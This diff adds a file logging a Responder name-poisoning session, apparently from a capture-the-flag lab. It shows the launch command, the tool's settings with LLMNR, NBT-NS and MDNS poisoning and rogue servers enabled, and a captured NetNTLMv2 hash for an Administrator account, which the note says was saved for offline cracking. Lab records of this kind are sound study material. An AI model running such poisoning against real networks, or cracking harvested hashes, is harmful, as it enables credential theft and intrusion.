@@ -1,0 +1,96 @@
+sudo responder -I tun0 -v
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+[*] Tips jar:
+    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
+    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+    DHCPv6                     [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.212]
+    Responder IPv6             [fe80::4b11:fd5b:5518:2b6b]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-L0L223OIFUI]
+    Responder Domain Name      [4ET8.LOCAL]
+    Responder DCE-RPC Port     [45293]
+
+[*] Version: Responder 3.2.2.0
+[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
+
+[+] Listening for events...                                                
+
+[!] Error starting TCP server on port 80, check permissions or other servers running.
+[SMB] NTLMv2-SSP Client   : 10.129.172.181
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:6ef9d0b99badfacd:66475FD58CD2578DDD63E940A68D24E8:
+0101000000000000802C61ACB20EDD01A77AE44B48B03DC60000000002000800340045005400380001001E00570049004E002D00
+4C0030004C003200320033004F00490046005500490004003400570049004E002D004C0030004C003200320033004F0049004600
+550049002E0034004500540038002E004C004F00430041004C000300140034004500540038002E004C004F00430041004C000500
+140034004500540038002E004C004F00430041004C0007000800802C61ACB20EDD01060004000200000008003000300000000000
+0000010000000020000055AAA6923B2C4159E41C57DC5938D271CABE61BD3D757E78FC74975C719741CC0A001000000000000000
+000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E0032003100320000000000
+00000000 
+
+
+Copied the captured NetNTLMv2 hash and saved it to a local file for offline cracking.
+[SMB] NTLMv2-SSP Client   : 10.129.172.181
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:6ef9d0b99badfacd:66475FD58CD2578DDD63E940A68D24E8:
+0101000000000000802C61ACB20EDD01A77AE44B48B03DC60000000002000800340045005400380001001E00570049004E002D00
+4C0030004C003200320033004F00490046005500490004003400570049004E002D004C0030004C003200320033004F0049004600
+550049002E0034004500540038002E004C004F00430041004C000300140034004500540038002E004C004F00430041004C000500
+140034004500540038002E004C004F00430041004C0007000800802C61ACB20EDD01060004000200000008003000300000000000
+0000010000000020000055AAA6923B2C4159E41C57DC5938D271CABE61BD3D757E78FC74975C719741CC0A001000000000000000
+000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E0032003100320000000000
+00000000  
